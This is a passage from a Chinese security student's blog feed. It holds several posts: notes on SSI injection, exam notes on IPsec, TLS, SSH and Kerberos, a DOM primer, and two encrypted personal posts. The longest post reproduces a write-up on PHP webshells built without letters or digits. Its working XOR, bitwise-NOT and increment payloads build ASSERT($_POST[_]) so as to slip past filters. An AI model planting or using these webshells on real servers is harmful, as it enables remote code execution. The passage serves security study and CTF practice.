class="headerlink" title="SSII"></a>SSII</h1><p>在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，服务器又开启了ssi支持的话就会存在SSI漏洞。</p><p>总而言之，就是在web服务器端开启SSI的情况下，在HTML页面中嵌入指令或脚本，最终得到服务端的信息。</p><h2 id="SSI注入条件"><a href="#SSI注入条件" class="headerlink" title="SSI注入条件"></a>SSI注入条件</h2><p>web服务端开启SSI功能</p><p>未对SSI语法进行过滤</p><p>返回的页面中包含用户输入</p><h2 id="SSII的检测与防御"><a href="#SSII的检测与防御" class="headerlink" title="SSII的检测与防御"></a>SSII的检测与防御</h2><p>识别页面是否包含.stm,.shtm和.shtml后缀</p><p>判断web服务器是否开启SSI</p><p>测试过滤的字符</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;整理一下SSII(Server-Side-Includes Injection , 服务器端包含注入)，这种漏洞需要的环境较为严格，极其少见
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>阿弟的情诗</title>
    <link href="https://xytk0x0.github.io/2019/10/30/%E9%98%BF%E5%BC%9F%E7%9A%84%E6%83%85%E8%AF%97/"/>
    <id>https://xytk0x0.github.io/2019/10/30/阿弟的情诗/</id>
    <published>2019-10-30T07:40:39.000Z</published>
    <updated>2019-11-17T04:06:33.981Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0a0c40ce5d9cd0190424b9d118deee786e687122364b3970ea47aa7e3016fc68">aca38bb186dac9dbfd316f1936b294e90d4f025628123339878afb313413e9d0bb8ce14bdda46ca0b83d49e1811577ab11eebf86124d7345ec69a77172d5e0eb5be1ce79fdf2315186d043d77163930dc8aa06daeafb0fccce186cb0e622211196ee348cab2ae47c6c76506503fc0da1c2f822e950b88f0e2730e21baf6f4502a20660de45e034d8909e1e083b5c47f72811f096221065e7fd5c58a48df7b70b11464315a6d1d3fbf3db7cc6ffd6519853f588f92f472c61ff959f51ba67386dd76b659613027e6de36d622ee4517237ebdae03a3e15c367b48f2752eb48501820117d172f088c05e1f0fd3d075f7a46cad43b393da745c27ee5e3ea150e58468d794d1fad698dc66d94e1baed8ba14685012347e52b97b721b8df1eaa08efe12477286d9e87bcd14817ccf0ba71c16d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>网络安全协议复习</title>
    <link href="https://xytk0x0.github.io/2019/10/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E5%A4%8D%E4%B9%A0/"/>
    <id>https://xytk0x0.github.io/2019/10/28/网络安全协议复习/</id>
    <published>2019-10-28T07:02:47.000Z</published>
    <updated>2019-10-31T10:27:04.641Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近这一周心态有点崩，基本上没看别的东西。要考试了，随便记录一下吧。</p><hr><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="网络安全需求"><a href="#网络安全需求" class="headerlink" title="网络安全需求"></a>网络安全需求</h2><p>1、机密性(防止数据的未授权公开)</p><p>2、完整性(防止数据被篡改)</p><p>3、可控性</p><p>限制对网络资源（硬件和软件）和数据（存储和通信）的访问，其目标是组织未授权使用资源、未授权公开或修改数据，其要素包括：标识和鉴别、授权、决策以及执行。</p><p>4、不可否认性 </p><p>通信实体需对自己的行为负责。包含两层含义，一是发送方不能否认自己发送数据的行为；二是接收方不能否认自己接收数据的行为。</p><p>5、可用性</p><p>合法用户能够正常获取服务。</p><h2 id="网络安全协议的定义"><a href="#网络安全协议的定义" class="headerlink" title="网络安全协议的定义"></a>网络安全协议的定义</h2><p>可定义为基于密码学的通信协议。该含义包括以下两层含义：</p><p>1、网络安全协议是以密码学为基础；</p><p>2、网络安全协议也是通信协议。</p><h2 id="构建网络安全协议的组件"><a href="#构建网络安全协议的组件" class="headerlink" title="构建网络安全协议的组件"></a>构建网络安全协议的组件</h2><p>包括加密与解密、消息摘要、消息验证码、数字签名、密钥管理</p><h3 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h3><p>对称加密算法：AES、三重数据加密标准(Triple DES,3DES)、RC2、RC4、国际数据加密算法(IDEA)</p><p>公钥加密算法：RSA、数字签名算法(DSA)、ElGamal、椭圆曲线密码(ECC)</p><h3 id="消息摘要"><a href="#消息摘要" class="headerlink" title="消息摘要"></a>消息摘要</h3><p>一段数据的摘要是表征该数据特征的字符串，获取数据摘要的功能通常由散列函数完成。</p><h4 id="散列函数的三个特性"><a href="#散列函数的三个特性" class="headerlink" title="散列函数的三个特性"></a>散列函数的三个特性</h4><p>1、映射分布均匀性和差分分布均匀性</p><p>实质是必须使输入中每一个比特信息，尽量均匀的反映到输出的每一个比特上面；输出中的每一个比特，都是输入中尽可能多比特的信息一起作用的结果。</p><p>2、单向性(不可伪造)</p><p>3、抗冲突性</p><p>在统计上无法产生两个散列值相同的预映射。</p><hr><h1 id="IP层安全IPsec"><a href="#IP层安全IPsec" class="headerlink" title="IP层安全IPsec"></a>IP层安全IPsec</h1><p>IPsec标准包含多个协议。包括互联网安全关联与密钥管理协议(ISAKMP)和互联网密钥交换(IKE)这两个交换协议，以及数据封装处理协议的认证首部(AH)和封装安全载荷(ESP)这两个数据封装协议。</p><h2 id="协议组成："><a href="#协议组成：" class="headerlink" title="协议组成："></a>协议组成：</h2><p>IPsec由一系列安全协议组成。把IP通信过程分成协商和数据交互两个阶段。在协商阶段，通信双方互相认证对方的身份，并根据安全策略协商使用的加密、认证算法，生成共享的会话密钥；在数据交互阶段，通信双方利用协商好的算法和密钥对数据进行安全处理以实现IPsec的各种安全功能。</p><img src="/2019/10/28/网络安全协议复习/0.png" title="XYTK"><p><strong>认证首部AH</strong>提供三类安全服务：数据完整性、数据源发认证和抗重放攻击</p><p><strong>封装安全载荷ESP</strong>提供五类安全服务：数据完整性、数据源发认证、抗重放攻击、机密性和有限的传输流机密性</p><h2 id="典型应用"><a href="#典型应用" class="headerlink" title="典型应用"></a>典型应用</h2><p>1、端到端的安全</p><p>2、基本VPN支持</p><p>3、保护移动用户访问内部网</p><p>4、嵌套式隧道</p><hr><h1 id="传输层安全SSL和TLS"><a href="#传输层安全SSL和TLS" class="headerlink" title="传输层安全SSL和TLS"></a>传输层安全SSL和TLS</h1><p>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层与应用层之间对网络连接进行加密。</p><hr><h1 id="会话安全SSH"><a href="#会话安全SSH" class="headerlink" title="会话安全SSH"></a>会话安全SSH</h1><p>Secure Shell(SSH) 是由 IETF(The Internet Engineering Task Force) 制定的建立在应用层基础上的安全网络协议。它是专为远程登录会话(甚至可以用Windows远程登录Linux服务器进行文件互传)和其他网络服务提供安全性的协议，可有效弥补网络中的漏洞。目前已经成为Linux系统的标准配置。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的， 就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式， 就是“中间人”冒充真正的服务器接收你传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”一转手做了手脚之后，就会出现很严重的问题。通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。</p><hr><h1 id="认证协议Kerberos"><a href="#认证协议Kerberos" class="headerlink" title="认证协议Kerberos"></a>认证协议Kerberos</h1><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。认证过程具体如下：客户机向认证服务器（AS）发送请求，要求得到某服务器的证书，然后 AS 的响应包含这些用客户端密钥加密的证书。证书的构成为： 1) 服务器 “ticket” ； 2) 一个临时加密密钥（又称为会话密钥 “session key”） 。客户机将 ticket （包括用服务器密钥加密的客户机身份和一份会话密钥的拷贝）传送到服务器上。会话密钥可以（现已经由客户机和服务器共享）用来认证客户机或认证服务器，也可用来为通信双方以后的通讯提供加密服务，或通过交换独立子会话密钥为通信双方提供进一步的通信加密服务。上述认证交换过程需要只读方式访问 Kerberos 数据库。但有时，数据库中的记录必须进行修改，如添加新的规则或改变规则密钥时。修改过程通过客户机和第三方 Kerberos 服务器（Kerberos 管理器 KADM）间的协议完成。有关管理协议在此不作介绍。另外也有一种协议用于维护多份 Kerberos 数据库的拷贝，这可以认为是执行过程中的细节问题，并且会不断改变以适应各种不同数据库技术。Kerberos又指麻省理工学院为这个协议开发的一套计算机网络安全系统。系统设计上采用客户端/服务器结构与DES加密技术，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。可以用于防止窃听、防止replay攻击、保护数据完整性等场合，是一种应用对称密钥体制进行密钥管理的系统。Kerberos的扩展产品也使用公开密钥加密方法进行认证。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近这一周心态有点崩，基本上没看别的东西。要考试了，随便记录一下吧。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; 
      
    
    </summary>
    
    
      <category term="网络" scheme="https://xytk0x0.github.io/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="网络" scheme="https://xytk0x0.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>没有真正的感同身受</title>
    <link href="https://xytk0x0.github.io/2019/10/27/%E6%B2%A1%E6%9C%89%E7%9C%9F%E6%AD%A3%E7%9A%84%E6%84%9F%E5%90%8C%E8%BA%AB%E5%8F%97/"/>
    <id>https://xytk0x0.github.io/2019/10/27/没有真正的感同身受/</id>
    <published>2019-10-27T05:58:36.000Z</published>
    <updated>2019-12-06T06:21:13.634Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dc624f33d5143fc966a1601986553e47df3c3e0af80227d6672ee4cdf31521fe"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>DOM文档对象模型</title>
    <link href="https://xytk0x0.github.io/2019/10/27/DOM%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/"/>
    <id>https://xytk0x0.github.io/2019/10/27/DOM文档对象模型/</id>
    <published>2019-10-27T01:56:56.000Z</published>
    <updated>2019-10-27T02:17:09.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DOM的概念"><a href="#DOM的概念" class="headerlink" title="DOM的概念"></a>DOM的概念</h1><p>DOM<strong>(Document Object Model)</strong>，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。</p><p>在 HTML DOM 中，所有事物都是节点。DOM 是被视为节点树的 HTML</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">整个文档是一个文档节点</span><br><span class="line">每个 HTML 元素是元素节点</span><br><span class="line">HTML 元素内的文本是文本节点</span><br><span class="line">每个 HTML 属性是属性节点</span><br><span class="line">注释是注释节点</span><br></pre></td></tr></table></figure><img src="/2019/10/27/DOM文档对象模型/0.png" title="XYTK"><h1 id="HTML-DOM-的方法和属性"><a href="#HTML-DOM-的方法和属性" class="headerlink" title="HTML DOM 的方法和属性"></a>HTML DOM 的方法和属性</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTML DOM 方法：</span><br><span class="line"></span><br><span class="line">getElementById(id) - 获取带有指定 id 的节点（元素）</span><br><span class="line">appendChild(node) - 插入新的子节点（元素）</span><br><span class="line">removeChild(node) - 删除子节点（元素）</span><br><span class="line"></span><br><span class="line">HTML DOM 属性：</span><br><span class="line"></span><br><span class="line">innerHTML - 节点（元素）的文本值</span><br><span class="line">parentNode - 节点（元素）的父节点</span><br><span class="line">childNodes - 节点（元素）的子节点</span><br><span class="line">attributes - 节点（元素）的属性节点</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DOM的概念&quot;&gt;&lt;a href=&quot;#DOM的概念&quot; class=&quot;headerlink&quot; title=&quot;DOM的概念&quot;&gt;&lt;/a&gt;DOM的概念&lt;/h1&gt;&lt;p&gt;DOM&lt;strong&gt;(Document Object Model)&lt;/strong&gt;，是一个平台和语言都中
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字的webshell</title>
    <link href="https://xytk0x0.github.io/2019/10/26/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell/"/>
    <id>https://xytk0x0.github.io/2019/10/26/无字母数字的webshell/</id>
    <published>2019-10-26T09:12:54.000Z</published>
    <updated>2019-10-28T03:25:59.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>p神原文。</p><p>链接： </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186298.html</a></p><p><a href="https://www.guildhab.top/?p=201" target="_blank" rel="noopener">https://www.guildhab.top/?p=201</a></p><hr><h1 id="一些不包含数字和字母的webshell"><a href="#一些不包含数字和字母的webshell" class="headerlink" title="一些不包含数字和字母的webshell"></a>一些不包含数字和字母的webshell</h1><p>“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) &#123;</span><br><span class="line">  eval($_GET[&apos;shell&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，这个代码如何利用？</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p><p>那么，变换方法 将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;</span><br><span class="line">$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><img src="/2019/10/26/无字母数字的webshell/0.jpg" title="XYTK"><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p><p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\x8c”，其取反即为字母s：</p><img src="/2019/10/26/无字母数字的webshell/1.jpg" title="XYTK"><p>选择一些汉字，生成如下答案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;&apos;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure><img src="/2019/10/26/无字母数字的webshell/2.jpg" title="XYTK"><p>这个答案还利用了PHP的弱类型特性。因为要获取’和’{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2。</p><h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。</p><p>这就得借助PHP的一个小技巧，先看文档： <a href="http://php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.increment.php</a></p><img src="/2019/10/26/无字母数字的webshell/3.jpg" title="XYTK"><p>也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</p><img src="/2019/10/26/无字母数字的webshell/4.jpg" title="XYTK"><p>也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</p><img src="/2019/10/26/无字母数字的webshell/5.jpg" title="XYTK"><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($_POST[_])，无需获取小写a）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;</span><br><span class="line">$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;_&apos;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure><p>执行结果：</p><img src="/2019/10/26/无字母数字的webshell/6.jpg" title="XYTK"><hr><h1 id="无字母数字webshell之提高篇"><a href="#无字母数字webshell之提高篇" class="headerlink" title="无字母数字webshell之提高篇"></a>无字母数字webshell之提高篇</h1><p>前几天有同学提出了一个问题，大概代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码如果要getshell，怎样利用？</p><p>这题可能来自是我曾写过的一篇文章：《一些不包含数字和字母的webshell》，里面介绍了如何构造无字母数字的webshell。其中有两个主要的思路：</p><p>1、利用位运算<br>2、利用自增运算符</p><p>当然，这道题多了两个限制：</p><p>webshell长度不超过35位<br>除了不包含字母数字，还不能包含$和_<br>难点呼之欲出了，我前面文章中给出的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为$不能使用了，所以我们无法构造PHP中的变量。</p><p>所以，如何解决这个问题？</p><h2 id="PHP7下简单解决问题"><a href="#PHP7下简单解决问题" class="headerlink" title="PHP7下简单解决问题"></a>PHP7下简单解决问题</h2><p>我们将上述代码放在index.php中，然后执行docker run –rm -p 9090:80 -v <code>pwd</code>:/var/www/html php:7.2-apache，启动一个php 7.2的服务器。</p><p>php7中修改了表达式执行的顺序： <a href="http://php.net/manual/zh/migration70.incompatible.php" target="_blank" rel="noopener">http://php.net/manual/zh/migration70.incompatible.php</a> ：</p><img src="/2019/10/26/无字母数字的webshell/7.png" 